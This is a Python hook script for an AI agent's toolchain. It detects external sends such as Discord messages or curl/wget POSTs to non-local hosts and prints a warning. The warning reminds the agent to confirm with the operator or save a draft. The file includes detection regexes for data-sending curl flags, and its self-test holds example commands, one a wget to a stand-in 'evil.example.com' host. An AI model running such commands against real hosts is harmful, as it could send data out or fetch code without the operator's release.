#!/usr/bin/env python3
"""
external_send_draft_gate (Operator Kit) - PreToolUse WARN-only: detects an
EXTERNAL send (message to a client / Discord / HTTP POST to an external host) and
reminds you to confirm explicitly or save a DRAFT in draft_dir first.

Why it exists: client-facing communication stays a draft until the operator
releases it. This hook does NOT try to prove prior approval happened (impossible
to infer safely); it only WARNS that the action looks like an external send.

Reads JSON from stdin: tool_name + tool_input (command / url / etc.).
Fires when:
  (a) tool_name is in guardrails.external_send_tools (from the profile), OR
  (b) command is curl/wget with a POST/PUT method to an EXTERNAL host
      (not localhost / 127.0.0.1 / *.local).

Config (operator-profile.yaml):
  guardrails.external_send_tools: [list of MCP tool names]
  paths.draft_dir: "drafts/"  (quoted in the warning)

WARN to stderr - exit 0 ALWAYS - any error -> exit 0 (defensive).

v1.0.0 - 2026-06-19 (Operator Kit - guard-distinct cluster)
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
try:
    from _lib.profile_loader import load_profile, get
except Exception:  # noqa: BLE001
    load_profile = None  # type: ignore[assignment]

    def get(_p, _d, default=None):  # type: ignore[misc]
        return default


_DEFAULT_SEND_TOOLS = [
    "mcp__discord__discord_send_message",
]

# internal hosts that do NOT count as an external send
_INTERNAL_HOST_RE = re.compile(
    r"^(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|.*\.local|.*\.internal)$",
    re.IGNORECASE,
)

# curl/wget with POST/PUT/PATCH (data send)
_POST_FLAG_RE = re.compile(
    r"(?:-X\s*(?:POST|PUT|PATCH)\b|--request\s+(?:POST|PUT|PATCH)\b|--data\b|-d\b|--data-raw\b|--data-binary\b|--upload-file\b|--method=(?:POST|PUT|PATCH))",
    re.IGNORECASE,
)
_URL_RE = re.compile(r"https?://([^/\s'\"]+)", re.IGNORECASE)


def _send_tools(prof: dict) -> list[str]:
    tools = get(prof, "guardrails.external_send_tools", None)
    if isinstance(tools, list) and tools:
        return [str(t) for t in tools]
    return _DEFAULT_SEND_TOOLS


def _is_external_url(command: str) -> str | None:
    """If the command has an http(s) URL to an external host, returns the host; else None."""
    for m in _URL_RE.finditer(command or ""):
        host = m.group(1).split("@")[-1].split(":")[0]
        if not _INTERNAL_HOST_RE.match(host):
            return host
    return None


def evaluate(tool_name: str, tool_input: dict, send_tools: list[str]) -> str | None:
    """
    Returns the REASON for the warning (str) or None if it is not an external send.
    Deterministic, testable without network.
    """
    if tool_name and tool_name in send_tools:
        return f"external-send tool `{tool_name}`"
    command = ""
    if isinstance(tool_input, dict):
        command = str(tool_input.get("command") or "")
    if command:
        head = command.lstrip()
        is_curl_wget = bool(re.match(r"(?:sudo\s+)?(?:curl|wget)\b", head, re.IGNORECASE))
        if is_curl_wget:
            posts = bool(_POST_FLAG_RE.search(command)) or head.lower().startswith("wget")
            host = _is_external_url(command)
            if host and (posts or "curl" in head.lower() and _POST_FLAG_RE.search(command)):
                return f"{'wget' if head.lower().startswith('wget') else 'curl'} POST to external host `{host}`"
            if host and posts:
                return f"HTTP send to external host `{host}`"
    return None


def _warn(reason: str, draft_dir: str) -> None:
    sys.stderr.write(
        f"[external_send_draft_gate] WARNING: {reason} — this looks like an EXTERNAL SEND.\n"
        f"  -> Confirm EXPLICITLY with the operator first, or save a draft in `{draft_dir}` "
        "for review. Client-facing communication stays a draft until released. "
        "WARN-only — not blocking, not assuming prior approval.\n"
    )


def main() -> None:
    try:
        raw = sys.stdin.read()
    except Exception:  # noqa: BLE001
        sys.exit(0)
    try:
        data = json.loads(raw) if raw.strip() else {}
    except Exception:  # noqa: BLE001
        sys.exit(0)
    try:
        prof = load_profile() if load_profile is not None else {}
        draft_dir = get(prof, "paths.draft_dir", "drafts/")
        tool_name = str(data.get("tool_name") or "")
        tool_input = data.get("tool_input") or {}
        if not isinstance(tool_input, dict):
            tool_input = {}
        reason = evaluate(tool_name, tool_input, _send_tools(prof))
        if reason:
            _warn(reason, str(draft_dir))
    except Exception:  # noqa: BLE001
        pass
    sys.exit(0)


def _self_test() -> None:
    tools = _DEFAULT_SEND_TOOLS
    # 1. configured external-send tool -> warns
    r = evaluate("mcp__discord__discord_send_message", {}, tools)
    assert r and "external-send" in r, f"should warn on discord, got {r}"
    # 2. curl POST to an external host -> warns
    r2 = evaluate("Bash", {"command": "curl -X POST https://api.cliente.com/msg -d 'oi'"}, tools)
    assert r2 and "external host" in r2, f"should warn on external curl POST, got {r2}"
    # 3. curl GET to an external host (no POST/data) -> does NOT warn (not a send)
    r3 = evaluate("Bash", {"command": "curl https://api.cliente.com/status"}, tools)
    assert r3 is None, f"an external GET is not a send, it should not warn: {r3}"
    # 4. curl POST to localhost -> does NOT warn (internal)
    r4 = evaluate("Bash", {"command": "curl -X POST http://localhost:9000/data -d '{}'"}, tools)
    assert r4 is None, f"an internal POST should not warn: {r4}"
    # 5. wget to an external host -> warns (wget downloads/sends)
    r5 = evaluate("Bash", {"command": "wget https://evil.example.com/x"}, tools)
    assert r5 and "external host" in r5, f"should warn on external wget, got {r5}"
    # 6. ordinary command -> does NOT warn
    r6 = evaluate("Bash", {"command": "ls -la docs/"}, tools)
    assert r6 is None, f"ls should not warn: {r6}"
    # 7. unknown tool with no command -> does NOT warn
    r7 = evaluate("Read", {"file_path": "x.md"}, tools)
    assert r7 is None, f"Read should not warn: {r7}"
    # 8. curl POST to 127.0.0.1 -> internal, no warning
    r8 = evaluate("Bash", {"command": "curl --data 'a=1' http://127.0.0.1:8080/health"}, tools)
    assert r8 is None, f"127.0.0.1 is internal: {r8}"
    print("self-test OK")


if __name__ == "__main__":
    try:
        sys.stdout.reconfigure(encoding="utf-8")  # type: ignore[attr-defined]
    except (AttributeError, ValueError):
        pass
    if len(sys.argv) > 1 and sys.argv[1] in ("--self-test", "-t"):
        _self_test()
    else:
        main()
